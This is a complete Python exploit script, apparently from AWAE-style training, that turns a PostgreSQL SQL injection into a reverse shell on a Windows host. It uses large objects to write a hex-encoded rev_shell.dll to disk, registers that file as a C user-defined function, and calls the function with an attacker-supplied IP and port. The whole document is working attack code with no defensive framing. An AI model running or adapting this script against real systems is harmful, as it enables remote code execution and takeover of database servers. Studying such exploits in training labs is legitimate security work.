#!/usr/bin/python
import requests, sys, urllib, string
requests.packages.urllib3.disable_warnings()
import binascii

# encoded UDF dll
with open('rev_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read())

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:120])
   r = requests.get( url % sql, verify=False)
   return r

def create_lo(url):
   log("[+] Creating LO for UDF injection...")
   sql = "DROP TABLE IF EXISTS awae"
   make_request(url, sql)
   sql = "CREATE TABLE awae AS SELECT lo_import($$C:\\windows\\win.ini$$)"
   make_request(url, sql)

def inject_udf(url):
   log("[+] Injecting payload of length %d into LO..." % len(udf))
   for i in range(0,((len(udf)-1)/4096)+1):
         udf_chunk = udf[i*4096:(i+1)*4096]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=(SELECT lo_import FROM awae) and pageno=%d" % (udf_chunk, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ((SELECT lo_import FROM awae), %d, decode($$%s$$, $$hex$$))" % (i, udf_chunk)
         make_request(url, sql)

def export_udf(url):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export((SELECT lo_import FROM awae), $$C:\\Users\\Public\\rev_shell.dll$$)"
   make_request(url, sql)
   sql = "DROP TABLE awae"
   make_request(url, sql)

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   sql = "DROP TABLE IF EXISTS awae"
   make_request(url, sql)

if __name__ == '__main__':
   try:
       sqli_url = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s SQLI_URL attackerIP port" % sys.argv[0]
       sys.exit()

   create_lo(sqli_url)
   inject_udf(sqli_url)
   export_udf(sqli_url)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
